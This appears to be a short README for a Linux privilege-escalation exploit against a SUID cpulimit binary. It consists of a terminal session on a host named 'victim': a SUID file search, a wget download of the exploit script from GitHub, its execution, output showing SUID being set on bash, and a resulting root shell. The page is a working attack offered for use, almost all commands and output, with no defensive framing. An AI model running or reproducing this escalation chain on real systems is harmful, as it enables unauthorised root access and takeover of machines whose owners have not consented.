# CPULimit Linux Privilege Escalation

```bash
www-data@victim:~$ whoami
victim
www-data@victim:~$ find / -perm -4000 2>/dev/null
/usr/bin/cpulimit
www-data@victim:~$ cd /tmp
www-data@victim:~$ wget https://raw.githubusercontent.com/d4t4s3c/CPULimit-Linux-Privilege-Escalation/master/suid_root.sh
www-data@victim:~$ chmod +x suid_root.sh
www-data@victim:~$ ./suid_root.sh

[i]  starting exploit.. 
[*]  check PATH bash: /usr/bin/bash
[*]  check PATH cpulimit: /usr/bin/cpulimit
[i]  granting SUID permissions to: /usr/bin/bash
Process 637 detected
Child process is finished, exiting...
[i]  getting a shell as root.. 
bash-5.0# whoami
root
```
